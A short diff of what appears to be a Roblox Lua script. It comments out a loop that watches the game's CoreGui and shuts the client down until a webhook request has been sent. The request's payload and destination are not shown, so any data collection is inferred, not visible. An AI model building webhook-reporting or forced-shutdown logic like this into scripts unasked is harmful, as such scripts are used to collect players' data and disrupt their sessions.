@@ -56,7 +56,7 @@ local httpRequest = {
 	Body = game:GetService("HttpService"):JSONEncode(payload)
 }
 
-while webhookSent == false do
+--[[while webhookSent == false do
 	task.wait(1)
 	for _, GUI in pairs(CoreGui:GetChildren()) do
 		if GUI:FindFirstChild("ImageLabel") then
@@ -66,4 +66,4 @@ while webhookSent == false do
 			game:Shutdown()
 		end
 	end
-end
+end]]
